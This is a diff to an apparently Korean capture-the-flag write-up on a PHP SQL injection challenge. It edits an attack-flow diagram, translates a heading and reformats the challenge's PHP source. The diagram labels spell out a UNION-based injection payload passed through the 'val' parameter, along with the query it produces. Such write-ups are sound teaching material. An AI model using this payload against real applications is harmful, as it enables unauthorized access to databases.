@@ -21,17 +21,17 @@
             "server" -> step1 -> step3 -> step5;
         }
         step0 -> step1[label="val='+'1)%0aunion%0aselect%0a3-1%23)",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step3 -> step2[label="select lv from lv1 where lv=('+'1)%0aunion%0aselect%0a3-1%23)",arrowhead="normal"];
     }
 
 |
 
-Source analysis
+소스 분석
 ================================================================================================================
 
-입력 부분: $_GET[val]
-
-출력 부분: @solve();
+- GET 파라미터: val
+- String
+- information_schema.processlist
 
 .. code-block:: php
     
@@ -96,14 +96,12 @@ Source analysis
         exit(); }
     if($data[0]==1)
     {
-        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
-        alert('Access_Denied!')><p>");
+        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=alert('Access_Denied!')><p>");
         echo("<!-- admin mode : val=2 -->");
     }
     if($data[0]==2)
     {
-        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
-        alert('Congratulation')><p>");
+        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=alert('Congratulation')><p>");
         @solve();
     } 
     </body>
